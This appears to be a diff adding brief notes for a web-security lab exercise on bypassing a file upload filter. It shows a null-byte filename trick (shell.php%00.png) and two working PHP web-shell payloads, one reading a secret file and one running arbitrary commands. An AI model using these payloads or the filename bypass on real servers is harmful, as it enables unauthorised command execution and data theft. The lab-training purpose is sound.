@@ -1,0 +1,22 @@
+Web shell upload via obfuscated file extension
+Goal: Exploit a file upload vulnerability to upload a web shell and exfiltrate the contents of the file /home/carlos/secret
+wiener:peter
+
+1)
+-login
+-upload image
+-upload shell.php
+-> Doesn't work
+
+2)
+-send post to repeater
+-change shell.php to shell.php%00.png, this is known as a null byte and in PhP the server will ignore everything after it.
+
+
+-Payload Option
+shell.php
+<?php echo file_get_contents('/home/carlos/secret');?>
+
+Payload Option
+shell.php
+<?php system($_GET['cmd']);?>
